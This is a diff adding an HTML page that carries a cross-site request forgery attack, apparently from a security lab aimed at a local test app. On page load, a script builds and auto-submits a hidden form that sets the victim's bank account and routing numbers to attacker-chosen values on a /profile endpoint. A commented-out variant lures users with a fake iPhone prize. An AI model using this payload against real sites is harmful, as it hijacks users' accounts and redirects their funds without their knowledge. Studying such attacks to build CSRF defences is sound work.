@@ -1,0 +1,40 @@
+<html lang="en">
+    <head></head>
+    <body>
+        <iframe name="hidden_iframe" style="display:none;"></iframe>
+        <script>
+            window.onload = function(){
+            // Create a <form> element
+            var p = document.createElement("form");
+            p.action = "https://localhost:5000/profile";
+            p.method = "post";
+            //p.target="hidden_iframe";
+            // The attacker needs to fill the form entries.
+            // The fields are hidden, the victim will not see them.
+            var fields;
+            fields += "<input type='hidden' name='bankAcc' value='9999999'>";
+            fields += "<input type='hidden' name='bankRouting' value='88888888#'>";
+            //fields += "<input type='hidden' name='_csrf' value=''>"
+            p.innerHTML = fields;
+            // Append the form to the current page
+            document.body.appendChild(p);
+            // Submit the form
+            p.submit();
+            }
+        </script>
+    </body>
+</html> 
+<!--<html lang="en">
+    <head></head>
+    	<body>
+    		<form method="POST" action="http://localhost:4000/profile">
+    			<h1> You are about to win a brand new iPhone!</h1>
+    			<h2> Click on the win button to claim it...</h2>
+    			<input type="hidden" name="bankAcc" value="9999999"/>
+    			<input type="hidden" name="bankRouting" value="88888888#"/>
+                                <input type="submit" value="Win !!!"/>
+    		</form>
+    	</body>
+    </html>-->
+
+    
